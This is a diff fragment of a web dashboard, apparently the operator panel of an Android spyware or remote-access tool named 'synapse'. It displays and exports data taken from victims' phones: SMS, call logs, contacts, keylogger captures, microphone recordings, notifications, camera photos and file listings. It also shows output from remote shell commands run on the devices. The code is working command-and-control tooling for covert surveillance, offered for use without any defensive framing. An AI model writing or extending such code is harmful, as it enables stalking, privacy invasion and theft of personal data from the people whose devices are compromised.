+    document.getElementById('result-cmd').textContent = 'sent to ' + activeDeviceId.substring(0, 12) + '...';
 }
 
-// CALLS
-function renderCallsViewer(){
-  const search=(document.getElementById('calls-search')?.value||'').toLowerCase();
-  const typeFilter=document.getElementById('calls-filter')?.value||'all';
-  const filtered=callsData.filter(c=>(!search||c.number.toLowerCase().includes(search))&&(typeFilter==='all'||c.type===typeFilter));
-  document.getElementById('calls-count').textContent=`${filtered.length} calls`;
-  document.getElementById('calls-viewer').innerHTML=!filtered.length?'<div class="empty-state"><span class="icon">📞</span>No calls found</div>':
-    `<table class="data-table"><thead><tr><th>Number</th><th>Type</th><th>Date</th><th>Duration</th></tr></thead><tbody>${filtered.map(c=>`<tr>
-      <td>${c.number||''}</td><td class="type-${c.type||''}">${c.type||''}</td>
-      <td>${c.date?new Date(c.date).toLocaleString():''}</td><td>${c.duration?sToHms(c.duration):'0s'}</td>
-    </tr>`).join('')}</tbody></table>`;
-}
-function sToHms(s){const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;return h>0?`${h}h${m}m${sec}s`:m>0?`${m}m${sec}s`:`${sec}s`;}
+// ================================================================
+// RESULT RENDERING
+// ================================================================
+function renderResult(result) {
+    var area = document.getElementById('result-area');
 
-// CONTACTS
-function renderContactsViewer(){
-  const search=(document.getElementById('contacts-search')?.value||'').toLowerCase();
-  const filtered=contactsData.filter(c=>!search||c.display_name.toLowerCase().includes(search)||c.phone_numbers.some(p=>p.toLowerCase().includes(search))||c.emails.some(e=>e.toLowerCase().includes(search)));
-  document.getElementById('contacts-count').textContent=`${filtered.length} contacts`;
-  document.getElementById('contacts-viewer').innerHTML=!filtered.length?'<div class="empty-state"><span class="icon">👥</span>No contacts found</div>':
-    `<table class="data-table"><thead><tr><th>Name</th><th>Phone Numbers</th><th>Emails</th></tr></thead><tbody>${filtered.map(c=>`<tr>
-      <td style="color:var(--text);font-weight:600">${c.display_name||''}</td>
-      <td>${(c.phone_numbers||[]).join(', ')}</td><td>${(c.emails||[]).join(', ')}</td>
-    </tr>`).join('')}</tbody></table>`;
-}
+    // Try to parse the data field as JSON for pretty-printing
+    var parsed = null;
+    var rawData = result.data || '';
 
-// MIC
-function renderMicViewer(){
-  document.getElementById('mic-count').textContent=`${micData.length} recordings`;
-  document.getElementById('mic-viewer').innerHTML=!micData.length?'<div class="empty-state"><span class="icon">🎙️</span>No recordings yet</div>':
-    `<table class="data-table"><thead><tr><th>Device</th><th>Time</th><th>Duration</th><th>Size</th><th>Audio</th></tr></thead><tbody>${micData.map((m,i)=>`<tr>
-      <td>${(m.device_id||'').substring(0,12)}...</td><td>${m.time||''}</td><td>${m.duration_seconds||0}s</td><td>${((m.size_bytes||0)/1024).toFixed(1)}KB</td>
-      <td>${m.audio_base64?`<div class="audio-row"><audio controls src="data:audio/aac;base64,${m.audio_base64}"></audio></div>`:'<span style="color:var(--dim)">In progress...</span>'}</td>
-    </tr>`).join('')}</tbody></table>`;
-}
+    if (rawData) {
+        try {
+            parsed = JSON.parse(rawData);
+        } catch(e) {
+            // Not JSON, display as plain text
+        }
+    }
 
-// NOTIFICATIONS
-function renderNotifsViewer(){
-  const search=(document.getElementById('notifs-search')?.value||'').toLowerCase();
-  const filtered=notifsData.filter(n=>!search||n.app_name.toLowerCase().includes(search)||n.title.toLowerCase().includes(search)||n.text.toLowerCase().includes(search)||n.package_name.toLowerCase().includes(search));
-  document.getElementById('notifs-count').textContent=`${filtered.length} notifications`;
-  document.getElementById('notifs-viewer').innerHTML=!filtered.length?'<div class="empty-state"><span class="icon">🔔</span>No notifications</div>':
-    filtered.map(n=>`<div class="notif-entry">
-      <div class="n-app">${n.app_name||n.package_name||'Unknown'} <span class="n-time">${n.timestamp?new Date(n.timestamp).toLocaleString():''}</span></div>
-      <div class="n-title">${n.title||''}</div><div class="n-text">${n.text||''}</div>
-    </div>`).join('');
-}
+    var html = '';
+    var mod = result.module || '';
+    var act = result.action || '';
 
-// KEYLOG
-function renderKeylogViewer(){
-  const search=(document.getElementById('keylog-search')?.value||'').toLowerCase();
-  const filtered=keylogData.filter(k=>!search||k.package_name.toLowerCase().includes(search)||k.text.toLowerCase().includes(search));
-  document.getElementById('keylog-count').textContent=`${filtered.length} keystrokes`;
-  document.getElementById('keylog-viewer').innerHTML=!filtered.length?'<div class="empty-state"><span class="icon">⌨️</span>No keystrokes</div>':
-    filtered.map(k=>`<div class="keylog-entry"><span class="kl-pkg">${k.package_name||''}</span><span class="kl-text">${k.text||''}</span><span class="kl-time">${k.timestamp?new Date(k.timestamp).toLocaleString():''}</span></div>`).join('');
-}
+    // --- Decide how to render based on module/action ---
+    if (mod === 'sms' && parsed && parsed.messages && Array.isArray(parsed.messages)) {
+        html += '<div style="padding:4px 0"><strong style="color:var(--teal)">SMS Messages (' + parsed.messages.length + ')</strong></div>';
+        parsed.messages.forEach(function(m) {
+            html += '<div class="sms-item">' +
+                '<div class="sms-sender">' + (m.address || 'Unknown') + '</div>' +
+                '<div class="sms-body">' + (m.body || '(empty)') + '</div>' +
+                '<div class="sms-meta">' + (m.type || '') + ' | ' + (m.date ? new Date(m.date).toLocaleString() : '') + '</div>' +
+                '</div>';
+        });
+    } else if (mod === 'calls' && parsed && parsed.calls && Array.isArray(parsed.calls)) {
+        html += '<div style="padding:4px 0"><strong style="color:var(--pink)">Call Log (' + parsed.calls.length + ')</strong></div>';
+        parsed.calls.forEach(function(c) {
+            html += '<div class="sms-item">' +
+                '<div class="sms-sender">' + (c.number || 'Unknown') + ' <span style="color:var(--dim)">[' + (c.type || '') + ']</span></div>' +
+                '<div class="sms-meta">' + (c.date ? new Date(c.date).toLocaleString() : '') + ' | ' + (c.duration || 0) + 's</div>' +
+                '</div>';
+        });
+    } else if (mod === 'contacts' && parsed && parsed.contacts && Array.isArray(parsed.contacts)) {
+        html += '<div style="padding:4px 0"><strong style="color:var(--purple)">Contacts (' + parsed.contacts.length + ')</strong></div>';
+        parsed.contacts.forEach(function(c) {
+            html += '<div class="sms-item">' +
+                '<div class="sms-sender">' + (c.display_name || 'Unknown') + '</div>' +
+                '<div class="sms-meta">' + (c.phone_numbers || []).join(', ') + '</div>' +
+                '</div>';
+        });
+    } else if (mod === 'files' && parsed && parsed.entries && Array.isArray(parsed.entries)) {
+        html += '<div style="padding:4px 0"><strong style="color:var(--orange)">Files (' + parsed.entries.length + ')</strong></div>';
+        parsed.entries.forEach(function(f) {
+            var icon = f.is_directory ? 'dir' : 'file';
+            var cls = f.is_directory ? 'isdir' : 'isfile';
+            html += '<div class="file-item ' + cls + '">' +
+                '<span class="file-name">' + (f.is_directory ? '📁 ' : '📄 ') + (f.name || '') + '</span>' +
+                '<span class="file-size">' + (f.size || '') + '</span>' +
+                '<span class="file-date">' + (f.modified || '') + '</span>' +
+                '</div>';
+        });
+    } else if (mod === 'shell' && act === 'exec' && parsed) {
+        html += '<div style="padding:4px 0"><strong style="color:var(--yellow)">Shell Output</strong></div>';
+        if (parsed.stdout) {
+            html += '<div style="color:var(--code)">' + escapeHtml(parsed.stdout) + '</div>';
+        }
+        if (parsed.stderr) {
+            html += '<div style="color:var(--red)">' + escapeHtml(parsed.stderr) + '</div>';
+        }
+        if (parsed.exit_code !== undefined) {
+            html += '<div style="color:var(--dim);font-size:10px;margin-top:4px">Exit: ' + parsed.exit_code + '</div>';
+        }
+    } else if (mod === 'camera' && parsed && parsed.image_base64) {
+        html += '<strong style="color:var(--purple)">Camera Capture</strong><br>';
+        html += '<img src="data:image/jpeg;base64,' + parsed.image_base64 + '" style="max-width:100%;max-height:400px;border-radius:4px;margin:8px 0">';
+    } else if (parsed) {
+        // Generic parsed JSON — pretty print
+        html += '<strong>' + mod + '/' + act + '</strong><br>';
+        html += syntaxHighlight(JSON.stringify(parsed, null, 2));
+    } else if (rawData) {
+        // Plain text result
+        html += '<strong>' + mod + '/' + act + '</strong><br>';
+        html += escapeHtml(rawData);
+    } else {
+        html += '<span style="color:var(--dim)">No data in result</span>';
+    }
 
-// ========== CAMERA GALLERY ==========
-function renderCameraGallery(){
-  document.getElementById('camera-gallery').innerHTML=!cameraImages.length?'<div class="empty-state" style="grid-column:1/-1"><span class="icon">📸</span>No camera captures yet</div>':
-    cameraImages.map((img,i)=>`<div class="camera-card"><img src="data:image/jpeg;base64,${img.image_base64}" onclick="openImageModal(this.src)" alt="Photo ${i+1}"><div class="cam-info"><span>${img.device_id?.substring(0,10)||''}...</span><span>${(img.size_bytes/1024).toFixed(0)}KB</span></div></div>`).join('');
-}
-
-// ========== FILE BROWSER ==========
-function clearFileBrowser(){fileEntries=[];document.getElementById('file-grid').innerHTML='<div class="empty-state" style="grid-column:1/-1"><span class="icon">📁</span>Select a path and click "List Files"</div>';}
-
-// ========== EXPORT ==========
-function exportData(type){
-  let data,filename;
-  switch(type){
-    case 'sms':data=smsData;filename='synapse_sms.json';break;
-    case 'calls':data=callsData;filename='synapse_calls.json';break;
-    case 'contacts':data=contactsData;filename='synapse_contacts.json';break;
-    case 'mic':data=micData;filename='synapse_mic.json';break;
-    case 'notifications':data=notifsData;filename='synapse_notifications.json';break;
-    case 'keylog':data=keylogData;filename='synapse_keylog.json';break;
-    default:return;
-  }
-  downloadFile(JSON.stringify(data,null,2),filename,'application/json');
-}
-function exportFeedJSON(){downloadFile(JSON.stringify(feedEntries,null,2),'synapse_feed.json','application/json');}
-function exportFeedCSV(){
-  const rows=[['device_id','type','tag','time','body']];
-  feedEntries.forEach(e=>rows.push([e.device_id||'',e.type||'',e.tag||'',e.time||'',e.body.replace(/<[^>]*>/g,'').substring(0,200)]));
-  downloadFile(rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n'),'synapse_feed.csv','text/csv');
-}
-function exportCSV(type){
-  let data,cols,filename;
-  switch(type){
-    case 'sms':data=smsData;cols=['address','body','type','date','read'];filename='synapse_sms.csv';break;
-    case 'calls':data=callsData;cols=['number','type','date','duration'];filename='synapse_calls.csv';break;
-    case 'contacts':data=contactsData;cols=['display_name','phone_numbers','emails'];filename='synapse_contacts.csv';break;
-    case 'notifications':data=notifsData;cols=['package_name','app_name','title','text','timestamp'];filename='synapse_notifications.csv';break;
-    case 'keylog':data=keylogData;cols=['text','package_name','timestamp'];filename='synapse_keylog.csv';break;
-    default:return;
-  }
-  const rows=[cols];
-  data.forEach(item=>rows.push(cols.map(c=>{const v=item[c];return Array.isArray(v)?v.join('; '):(v??'')})));
-  downloadFile(rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n'),filename,'text/csv');
-}
-function downloadFile(content,filename,mime){
-  const blob=new Blob([content],{type:mime});
-  const url=URL.createObjectURL(blob);
-  const a=document.createElement('a');a.href=url;a.download=filename;a.click();
-  URL.revokeObjectURL(url);toast(`Exported: ${filename}`,'success');
+    area.innerHTML = html;
+    document.getElementById('result-label').textContent = mod + '/' + act;
+    document.getElementById('result-cmd').textContent = 'from ' + (result.device_id || '').substring(0, 12) + '... at ' + (result.time || '');
 }
 
-// ========== UI HELPERS ==========
-function switchTab(name){
-  document.querySelectorAll('#main-tabs button[data-tab]').forEach(b=>b.classList.remove('active'));
-  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
-  const tabBtn=document.querySelector(`#main-tabs button[data-tab="${name}"]`);
-  if(tabBtn)tabBtn.classList.add('active');
-  const panel=document.getElementById('panel-'+name);
-  if(panel)panel.classList.add('active');
-  activeTab=name;
-  if(name==='map'&&mapInstance)mapInstance.invalidateSize();
-}
-function openImageModal(src){document.getElementById('modal-image').src=src;document.getElementById('image-modal').classList.add('show');}
-function closeImageModal(){document.getElementById('image-modal').classList.remove('show');}
-function toast(msg,type){const c=document.getElementById('toast-container');const t=document.createElement('div');t.className='toast '+(type||'');t.textContent=msg;c.appendChild(t);setTimeout(()=>t.remove(),3500);}
-
-// ========== TAB SWITCHING ==========
-document.getElementById('main-tabs').addEventListener('click',e=>{
-  const btn=e.target.closest('button[data-tab]');
-  if(btn)switchTab(btn.dataset.tab);
-});
-document.getElementById('feed-filter').addEventListener('click',e=>{
-  const btn=e.target.closest('.flt');
-  if(!btn)return;
-  document.querySelectorAll('.feed-filter .flt').forEach(f=>f.classList.remove('active'));
-  btn.classList.add('active');
-  currentFeedFilter=btn.dataset.flt;
-  renderFeed();
-});
-
-// ========== INIT ==========
-function initMap(){
-  if(mapInstance)return;
-  mapInstance=L.map('map-container').setView([0,0],1);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:18,attribution:'&copy; OSM'}).addTo(mapInstance);
+// --- Helpers ---
+function escapeHtml(text) {
+    return String(text)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
 }
 
-fetchDevices();
-connectSSE();
-initMap();
-setInterval(fetchDevices,15000);
-setInterval(()=>{if(mapInstance)mapInstance.invalidateSize();},30000);
+function syntaxHighlight(json) {
+    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    return json.replace(/("(\\u[a-fA-F0-9]{4}|\\[^u]|[^"\\])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function(match) {
+        var cls = 'val-num';
+        if (/^"/.test(match)) {
+            if (/:$/.test(match)) {
+                cls = 'key';
+            } else {
+                cls = 'val-str';
+            }
+        } else if (/true|false/.test(match)) {
+            cls = 'val-bool';
+        } else if (/null/.test(match)) {
+            cls = 'null';
+        }
+        return '<span class="' + cls + '">' + match + '</span>';
+    });
+}
 
-// Update file browser and camera when results come in
-document.addEventListener('DOMContentLoaded',()=>{});
+// ================================================================
+// SSE CONNECTION
+// ================================================================
+function connectSSE() {
+    var source = new EventSource(API_BASE + '/api/events');
+
+    source.onopen = function() {
+        document.getElementById('sse-dot').className = 'dot green';
+        document.getElementById('sse-label').textContent = 'SSE Connected';
+    };
+
+    source.onerror = function() {
+        document.getElementById('sse-dot').className = 'dot red';
+        document.getElementById('sse-label').textContent = 'SSE Disconnected';
+        source.close();
+        setTimeout(connectSSE, 3000);
+    };
+
+    source.onmessage = function(e) {
+        try {
+            var result = JSON.parse(e.data);
+            if (!result || !result.device_id) return;
+
+            resultCount++;
+            document.getElementById('st-results').textContent = resultCount;
+            lastResult = result;
+
+            // If this result is from the currently selected device, render it
+            if (activeDeviceId && result.device_id === activeDeviceId) {
+                renderResult(result);
+            }
+        } catch(ex) {
+            // silently ignore parse errors
+        }
+    };
+}
+
+// ================================================================
+// INITIALIZATION
+// ================================================================
+window.onload = function() {
+    fetchDevices();
+    connectSSE();
+    // Poll devices every 3 seconds
+    setInterval(fetchDevices, 3000);
+};
 </script>
 </body>
 </html>
